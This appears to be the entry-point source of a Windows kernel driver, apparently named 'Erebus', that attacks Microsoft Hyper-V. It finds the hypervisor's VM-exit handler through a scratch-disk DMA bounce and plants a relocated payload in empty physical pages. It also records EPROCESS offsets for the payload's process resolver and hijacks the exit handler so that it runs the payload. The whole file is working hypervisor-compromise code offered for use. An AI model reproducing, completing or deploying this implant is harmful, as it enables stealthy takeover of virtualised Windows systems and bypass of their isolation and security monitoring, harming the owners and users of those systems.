#include "hyperv.hpp"

// EPROCESS offsets for the Windows builds supported by this driver. The
// payload's process resolver is driven entirely by these values.
typedef struct _EREBUS_EPROCESS_OFFSETS {
    ULONG BuildMin;
    ULONG BuildMax;
    ULONG DirectoryTableBase;
    ULONG UserDirectoryTableBase;
    ULONG Peb;
    ULONG UniqueProcessId;
    ULONG ActiveProcessLinks;
} EREBUS_EPROCESS_OFFSETS;

static const EREBUS_EPROCESS_OFFSETS ErebusEprocessOffsets[] = {
    { 19041, 19045, 0x028, 0x388, 0x550, 0x440, 0x448 },
    { 22000, 22000, 0x028, 0x388, 0x550, 0x440, 0x448 },
    { 22621, 22631, 0x028, 0x388, 0x550, 0x440, 0x448 },
    { 26100, 26299, 0x028, 0x158, 0x2E0, 0x1D0, 0x1D8 },
};

static const EREBUS_EPROCESS_OFFSETS* ErebusGetEprocessOffsets()
{
    RTL_OSVERSIONINFOW version = { };
    version.dwOSVersionInfoSize = sizeof(version);
    if (!NT_SUCCESS(RtlGetVersion(&version))) return NULL;

    for (ULONG i = 0; i < RTL_NUMBER_OF(ErebusEprocessOffsets); ++i) {
        const EREBUS_EPROCESS_OFFSETS* item = &ErebusEprocessOffsets[i];
        if (version.dwBuildNumber >= item->BuildMin &&
            version.dwBuildNumber <= item->BuildMax) {
            return item;
        }
    }
    return NULL;
}

static BOOLEAN ErebusReadKernelU64(PVOID base, ULONG offset, UINT64* value)
{
    __try {
        *value = *reinterpret_cast<volatile UINT64*>(
            reinterpret_cast<PUINT8>(base) + offset);
        return TRUE;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        *value = 0;
        return FALSE;
    }
}

static BOOLEAN ErebusDirectoryBaseValid(UINT64 directoryBase)
{
    return (directoryBase & EREBUS_PHYS_MASK_4KB) != 0;
}

static UINT64 ErebusReadProcessDirectoryBase(
    PEPROCESS process, const EREBUS_EPROCESS_OFFSETS* offsets)
{
    UINT64 directoryBase = 0;
    if (!process || !offsets ||
        !ErebusReadKernelU64(process, offsets->DirectoryTableBase, &directoryBase) ||
        !ErebusDirectoryBaseValid(directoryBase)) {
        return 0;
    }
    return directoryBase;
}

static BOOLEAN ErebusFillKernelLayout(ErebusKernelLayout* layout)
{
    const EREBUS_EPROCESS_OFFSETS* offsets = ErebusGetEprocessOffsets();
    if (!layout || !offsets || !PsInitialSystemProcess) return FALSE;

    UINT64 systemDirectoryBase =
        ErebusReadProcessDirectoryBase(PsInitialSystemProcess, offsets);
    if (systemDirectoryBase == 0) return FALSE;

    RTL_OSVERSIONINFOW version = { };
    version.dwOSVersionInfoSize = sizeof(version);
    if (!NT_SUCCESS(RtlGetVersion(&version))) return FALSE;

    RtlZeroMemory(layout, sizeof(*layout));
    layout->magic                        = EREBUS_KERNEL_LAYOUT_MAGIC;
    layout->size                         = sizeof(*layout);
    layout->ntBuildNumber                = version.dwBuildNumber;
    layout->psInitialSystemProcess       = reinterpret_cast<UINT64>(PsInitialSystemProcess);
    layout->systemDirectoryTableBase     = systemDirectoryBase;
    layout->eprocessDirectoryTableBase   = offsets->DirectoryTableBase;
    layout->eprocessUserDirectoryTableBase = offsets->UserDirectoryTableBase;
    layout->eprocessPeb                  = offsets->Peb;
    layout->eprocessUniqueProcessId      = offsets->UniqueProcessId;
    layout->eprocessActiveProcessLinks   = offsets->ActiveProcessLinks;
    return TRUE;
}

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING)
{
    UNREFERENCED_PARAMETER(drv);

    PDISK  disk                 = NULL;
    PVOID  exitHandlerBuffer    = NULL;
    PVOID  emptyContinuousPages = NULL;
    EREBUS_PHYSICAL_MAPPING exitHandlerMapping = { };
    EREBUS_PHYSICAL_MAPPING emptyPagesMapping   = { };
    PPHYSICAL_MEMORY_RANGE hyperVRange = NULL;
    NTSTATUS st = STATUS_SUCCESS;
    UINT64 exitHandlerAddr = 0;
    PHYSICAL_ADDRESS emptyPagesPa = { };
    UINT32 originalHookOffset   = 0, entryPoint            = 0;
    UINT32 callDispatcherOffset = 0, afterCallDeltaOffset  = 0;
    UINT32 kernelLayoutOffset   = 0;
    PHYSICAL_ADDRESS pdptPa = { };

    // 1. verify the Hyper-V hypervisor is present.
    if (!IsHyperVRunning()) {
        DbgMsg("Hyper-V vendor leaf was not observed");
        return STATUS_UNSUCCESSFUL;
    }

    // 2. find the vhdmp-backed scratch disk used for the DMA bounce copy.
    st = DiskFind(&disk);
    if (!NT_SUCCESS(st)) { DbgMsg("DiskFind failed"); goto Cleanup; }

    // 3. find the Hyper-V VM-exit handler call site.
    st = FindVMExitHandler(disk, &exitHandlerMapping,
        &exitHandlerBuffer, &exitHandlerAddr, &hyperVRange);
    if (!NT_SUCCESS(st)) { DbgMsg("FindVMExitHandler failed: %08X", st); goto Cleanup; }
    DbgMsg("Found Hyper-V VMEXIT handler at: %p", exitHandlerAddr);

    // 4. find contiguous all-ones pages for the resident payload image.
    st = FindContinuousEmptyPagesInRange(hyperVRange, disk,
        PayLoadPageCount(), &emptyContinuousPages, &emptyPagesMapping, &emptyPagesPa);
    if (!NT_SUCCESS(st)) {
        DbgMsg("FindContinuousEmptyPagesInRange failed: %08X", st);
        goto Cleanup;
    }
    DbgMsg("Found empty pages at phys: %p", emptyPagesPa);

    // 5. relocate the payload image and build its page tables.
    st = PreparePayload(payloadData, &emptyContinuousPages, PayLoadPageCount(),
        emptyPagesPa, &pdptPa,
        &originalHookOffset, &entryPoint,
        &callDispatcherOffset, &afterCallDeltaOffset,
        &kernelLayoutOffset);
    if (!NT_SUCCESS(st)) { DbgMsg("PreparePayload failed: %08X", st); goto Cleanup; }

    // 6. publish the kernel layout the payload's process resolver needs.
    {
        ErebusKernelLayout layout{ };
        if (!ErebusFillKernelLayout(&layout)) {
            DbgMsg("ErebusFillKernelLayout failed");
            st = STATUS_NOT_SUPPORTED;
            goto Cleanup;
        }
        auto* dst = reinterpret_cast<ErebusKernelLayout*>(
            (PUINT8)emptyContinuousPages + kernelLayoutOffset);
        RtlCopyMemory(dst, &layout, sizeof(layout));
    }

    // 7. record the original-call return delta inside the payload. The
    // post-original path in the dispatcher jumps to
    // `ErebusOriginalHandler + ErebusAfterCallDelta`; without this write the
    // delta stays 0 and the POST path re-enters the original handler entry.
    {
        PUINT8 callInstr = reinterpret_cast<PUINT8>(exitHandlerAddr);
        INT32 originalCallRel = *reinterpret_cast<INT32*>(callInstr + 1);
        PUINT8 originalCallTarget = callInstr + 5 + originalCallRel;
        PUINT8 afterCall = callInstr + 5;
        INT64 afterCallDelta = static_cast<INT64>(afterCall - originalCallTarget);
        *reinterpret_cast<UINT64*>(
            reinterpret_cast<PUINT8>(emptyContinuousPages) + afterCallDeltaOffset) =
            static_cast<UINT64>(afterCallDelta);
        DbgMsg("payload dispatch delta: original=%p after=%p delta=%lld",
            originalCallTarget, afterCall, afterCallDelta);
    }

    // 8. write the payload pages through the scratch-disk DMA bounce.
    st = DiskCopyPages(disk, emptyPagesMapping.VirtualAddress,
        emptyContinuousPages, PayLoadPageCount());
    if (!NT_SUCCESS(st)) { DbgMsg("DiskCopyPages failed: %08X", st); goto Cleanup; }

    // 9. hijack the VM-exit handler.
    st = HijackVMExitHandler(disk, exitHandlerAddr, exitHandlerBuffer,
        exitHandlerMapping.VirtualAddress, pdptPa, originalHookOffset,
        callDispatcherOffset);
    if (!NT_SUCCESS(st)) {
        DbgMsg("HijackVMExitHandler failed: %08X", st);
        goto Cleanup;
    }

    {
        UINT64 initialHookSlot = 0;
        RtlCopyMemory(&initialHookSlot,
            (PUINT8)emptyPagesMapping.VirtualAddress + originalHookOffset,
            sizeof(initialHookSlot));
        if (initialHookSlot == 0) {
            DbgMsg("initial loader hook did not execute: slot=%p", (PVOID)initialHookSlot);
            st = STATUS_INVALID_ADDRESS;
            goto Cleanup;
        }
        DbgMsg("initial loader hook slot=%p", (PVOID)initialHookSlot);
    }

    DbgMsg("VMEXIT handler redirected to %p", PAYLOAD_VIRTUAL_BASE + entryPoint);

Cleanup:
    if (disk)        DiskRelease(disk);
    if (hyperVRange) ExFreePool(hyperVRange);
    UnmapPhysicalBounceMapping(&exitHandlerMapping);
    UnmapPhysicalBounceMapping(&emptyPagesMapping);
    if (exitHandlerBuffer)    MmFreeContiguousMemory(exitHandlerBuffer);
    if (emptyContinuousPages) MmFreeContiguousMemory(emptyContinuousPages);

    DbgMsg("Erebus DriverEntry complete: status=%08X", st);
    return st;
}
